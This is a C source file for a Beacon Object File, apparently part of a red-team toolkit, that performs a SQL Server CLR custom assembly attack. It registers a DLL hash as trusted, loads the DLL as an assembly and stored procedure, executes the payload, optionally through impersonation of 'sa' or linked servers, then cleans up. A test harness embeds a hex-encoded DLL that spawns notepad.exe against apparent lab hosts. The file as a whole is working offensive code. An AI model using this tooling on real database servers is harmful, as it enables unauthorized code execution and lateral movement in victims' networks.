#include "bofdefs.h"
#include "base.c"
#include "sql.c"
#include "sql_modules.c"
#include "sql_clr.c"


void ExecuteClrAssembly(char* server, char* database, char* link, char* impersonate, char* function, char* hash, char* hexBytes)
{
    SQLHENV env			 = NULL;
    SQLHSTMT stmt 		 = NULL;
	SQLHDBC dbc 		 = NULL;
	SQLRETURN ret;

	InitRandomSeed();
	char* dllPath 		= GenerateRandomString(8);
	char* assemblyName 	= GenerateRandomString(8);

    if (link == NULL)
	{
		dbc = ConnectToSqlServer(&env, server, database);
	}
	else
	{
		dbc = ConnectToSqlServer(&env, server, NULL);
	}

    if (dbc == NULL) {
		goto END;
	}

	if (link == NULL)
	{
		internal_printf("[*] Performing CLR custom assembly attack on %s\n\n", server);
	}
	else
	{
		internal_printf("[*] Performing CLR custom assembly attack on %s via %s\n\n", link, server);
	}
	//
	// allocate statement handle
	//
	ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
	if (!SQL_SUCCEEDED(ret)) {
		internal_printf("[!] Failed to allocate statement handle\n");
		goto END;
	}

	//
	// verify that xp_cmdshell is enabled
	//
	if (IsModuleEnabled(stmt, "clr enabled", link, impersonate))
	{
		internal_printf("[*] CLR is enabled\n");
	}
	else
	{
		internal_printf("[!] CLR is not enabled\n");
		goto END;
	}

	//
	// close the cursor
	//
	ret = ODBC32$SQLCloseCursor(stmt);
	if (!SQL_SUCCEEDED(ret)) {
		internal_printf("[!] Failed to close cursor\n");
		goto END;
	}

	//
	// if using linked server, ensure rpc is enabled
	//
	if (link != NULL)
	{
		if (IsRpcEnabled(stmt, link))
		{
			internal_printf("[*] RPC out is enabled\n");
		}
		else
		{
			internal_printf("[!] RPC out is not enabled\n");
			goto END;
		}
		
		//
		// close the cursor
		//
		ret = ODBC32$SQLCloseCursor(stmt);
		if (!SQL_SUCCEEDED(ret)) {
			internal_printf("[!] Failed to close cursor\n");
			goto END;
		}
	}

	//
	// Check if the assembly hash already exists in sys.trusted_assemblies
	// and drop it if it does
	//
	if (AssemblyHashExists(stmt, hash, link, impersonate))
	{
		internal_printf("[!] Assembly hash already exists in sys.trusted_assesmblies\n");
		internal_printf("[*] Dropping existing assembly hash before continuing\n");

		//
		// Close the cursor
		//
		ret = ODBC32$SQLCloseCursor(stmt);
		if (!SQL_SUCCEEDED(ret)) {
			internal_printf("[!] Failed to close cursor\n");
			goto END;
		}
		
		if (!DeleteTrustedAssembly(stmt, hash, link, impersonate))
		{
			internal_printf("[!] Failed to drop existing assembly hash\n");
			goto END;
		}
	}
	else
	{
		//
		// Close the cursor
		//
		ret = ODBC32$SQLCloseCursor(stmt);
		if (!SQL_SUCCEEDED(ret)) {
			internal_printf("[!] Failed to close cursor\n");
			goto END;
		}
	}

	//
	// Add the DLL to sys.trusted_assemblies
	//
	if (!AddTrustedAssembly(stmt, dllPath, hash, link, impersonate))
	{
		internal_printf("[!] Failed to add trusted assembly\n");
		goto END;
	}

	internal_printf("[*] Added SHA-512 hash for DLL to sys.trusted_assemblies with the name \"%s\"\n", dllPath);

	//
	// Ensure procedure and assembly names do not already exist
	//
	if (!DeleteTrustedAssemblyResources(stmt, assemblyName, function, FALSE, link, impersonate))
	{
		internal_printf("[!] Failed to drop existing assembly and procedure\n");
		goto END;
	}

	//
	// Create the custom assembly
	//
	internal_printf("[*] Creating a new custom assembly with the name \"%s\"\n", assemblyName);
	if(!CreateAssembly(stmt, assemblyName, hexBytes, link, impersonate)) {
		internal_printf("[!] Failed to create custom assembly. This probably happened as the assembly was uploaded before using a different name. See SQL error message\n");
		goto END;
	}
	
	//
	// Verify that the assembly exists before we continue
	//
	if (!AssemblyExists(stmt, assemblyName, link, impersonate))
	{
		internal_printf("[!] Failed to create custom assembly\n");
		internal_printf("[*] Cleaning up...\n");
		DeleteTrustedAssembly(stmt, hash, link, impersonate);
		DeleteTrustedAssemblyResources(stmt, assemblyName, function, FALSE, link, impersonate);
		goto END;
	}

	//
	// Create the stored procedure
	//
	internal_printf("[*] Loading DLL into stored procedure \"%s\"\n", function);
	CreateAssemblyStoredProc(stmt, assemblyName, function, FALSE, link, impersonate);

	//
	// Verify that the stored procedure exists before we continue
	//
	if (!AssemblyStoredProcExists(stmt, function, link, impersonate))
	{
		internal_printf("[!] Stored procedure not found\n");
		internal_printf("[*] Cleaning up...\n");
		DeleteTrustedAssembly(stmt, hash, link, impersonate);
		DeleteTrustedAssemblyResources(stmt, assemblyName, function, FALSE, link, impersonate);
		goto END;
	}

	internal_printf("[*] Created \"[%s].[StoredProcedures].[%s]\"\n", assemblyName, function);

	//
	// Execute the stored procedure
	//
	internal_printf("[*] Executing payload...\n");
	ExecuteAssemblyStoredProc(stmt, function, link, impersonate);

	//
	// Cleanup before we exit
	//
	internal_printf("[*] Cleaning up...\n");
	DeleteTrustedAssembly(stmt, hash, link, impersonate);
	DeleteTrustedAssemblyResources(stmt, assemblyName, function, FALSE, link, impersonate);


END:
	intFree(dllPath);
	intFree(assemblyName);
	ODBC32$SQLCloseCursor(stmt);
	DisconnectSqlServer(env, dbc, stmt);
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	char* server;
	char* database;
	char* link;
	char* impersonate;
	char* function;
	char* hash;
	char* hexBytes;
	LPBYTE lpDllBuffer = NULL;
	DWORD dwDllBufferSize = 0;

	//
	// parse beacon args 
	//
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	server	 	= BeaconDataExtract(&parser, NULL);
	database 	= BeaconDataExtract(&parser, NULL);
	link 		= BeaconDataExtract(&parser, NULL);
	impersonate = BeaconDataExtract(&parser, NULL);
	function 	= BeaconDataExtract(&parser, NULL);
	hash		= BeaconDataExtract(&parser, NULL);
	lpDllBuffer = BeaconDataExtract(&parser, (int*)&dwDllBufferSize);

	server = *server == 0 ? "localhost" : server;
	database = *database == 0 ? "master" : database;
	link = *link  == 0 ? NULL : link;
	impersonate = *impersonate == 0 ?  NULL : impersonate;

	if(!bofstart())
	{
		return;
	}

	if (UsingLinkAndImpersonate(link, impersonate))
	{
		return;
	}

	//
	// Convert the raw dll to hex string
	//
	hexBytes = (char*) intAlloc(dwDllBufferSize * 2 + 1);
	if (hexBytes == NULL)
	{
		internal_printf("[!] Failed to allocate memory for hex conversion\n");
		printoutput(FALSE);
		return;
	}

	for (DWORD i = 0; i < dwDllBufferSize; i++)
	{
		MSVCRT$sprintf(hexBytes + (i * 2), "%02X", lpDllBuffer[i]);
	}
	hexBytes[dwDllBufferSize * 2] = '\0';

	ExecuteClrAssembly(server, database, link, impersonate, function, hash, hexBytes);
	intFree(hexBytes);
	printoutput(TRUE);
};

#else

int main()
{
	//
	// DLL spawns notepad.exe
	// source here: https://github.com/Tw1sm/PySQLRecon/blob/main/resources/dotnet/CreateProcess.cs
	//
	char* bytes = "4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c010300607eef640000000000000000e00002210b010b00000400000006000000000000ce2300000020000000400000000000100020000000020000040000000000000004000000000000000080000000020000000000000300408500001000001000000000100000100000000000001000000000000000000000007c2300004f00000000400000b802000000000000000000000000000000000000006000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e74657874000000d4030000002000000004000000020000000000000000000000000000200000602e72737263000000b8020000004000000004000000060000000000000000000000000000400000402e72656c6f6300000c0000000060000000020000000a00000000000000000000000000004000004200000000000000000000000000000000b02300000000000048000000020005006820000014030000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000036007201000070280400000a262a1e02280500000a2a000042534a4201000100000000000c00000076342e302e33303331390000000005006c0000001c010000237e0000880100001401000023537472696e6773000000009c0200001c00000023555300b8020000100000002347554944000000c80200004c00000023426c6f620000000000000002000001471400000900000000fa253300160000010000000500000002000000020000000500000003000000010000000300000000000a0001000000000006003d0036000600780058000600980058000a00dd00c2000e000601f3000000000001000000000001000100010010001c000000050001000100502000000000960044000a0001005e2000000000861852000e000100110052001200190052000e00210052000e0029000e011c00090052000e0020001b0017002e000b0022002e0013002b000480000000000000000000000000000000004400000004000000000000000000000001002d00000000000400000000000000000000000100b6000000000004000000000000000000000001003600000000000000003c4d6f64756c653e0043726561746550726f636573732e646c6c0053746f72656450726f63656475726573006d73636f726c69620053797374656d004f626a6563740043726561746550726f63657373002e63746f720053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300436f6d70696c6174696f6e52656c61786174696f6e734174747269627574650052756e74696d65436f6d7061746962696c6974794174747269627574650053797374656d2e44617461004d6963726f736f66742e53716c5365727665722e5365727665720053716c50726f6365647572654174747269627574650053797374656d2e446961676e6f73746963730050726f636573730053746172740000176e006f00740065007000610064002e0065007800650000000000e9bbd494c7999b429267cfb509264f810008b77a5c561934e08903000001032000010420010108040100000005000112150e0801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010000a42300000000000000000000be230000002000000000000000000000000000000000000000000000b0230000000000000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ff25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005c02000000000000000000005c0234000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000000000000000000000000000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004bc010000010053007400720069006e006700460069006c00650049006e0066006f0000009801000001003000300030003000300034006200300000002c0002000100460069006c0065004400650073006300720069007000740069006f006e000000000020000000300008000100460069006c006500560065007200730069006f006e000000000030002e0030002e0030002e003000000044001200010049006e007400650072006e0061006c004e0061006d0065000000430072006500610074006500500072006f0063006500730073002e0064006c006c0000002800020001004c006500670061006c0043006f0070007900720069006700680074000000200000004c00120001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000430072006500610074006500500072006f0063006500730073002e0064006c006c000000340008000100500072006f006400750063007400560065007200730069006f006e00000030002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000030002e0030002e0030002e00300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000d03300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	
	internal_printf("============ BASE TEST ============\n\n");
	ExecuteClrAssembly("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "CreateProcess", "18dcee3265e0143d695ef0534ef9ab29f68d772d8b04fb7cfee39275aa1b3501d974591643bcf17f0ca3836d386aea57f09657783f23a70bcce7db2ddfb80f99", bytes);

	internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
	ExecuteClrAssembly("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "CreateProcess", "18dcee3265e0143d695ef0534ef9ab29f68d772d8b04fb7cfee39275aa1b3501d974591643bcf17f0ca3836d386aea57f09657783f23a70bcce7db2ddfb80f99", bytes);

	internal_printf("\n\n============ LINK TEST ============\n\n");
	ExecuteClrAssembly("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "CreateProcess", "18dcee3265e0143d695ef0534ef9ab29f68d772d8b04fb7cfee39275aa1b3501d974591643bcf17f0ca3836d386aea57f09657783f23a70bcce7db2ddfb80f99", bytes);
}

#endif
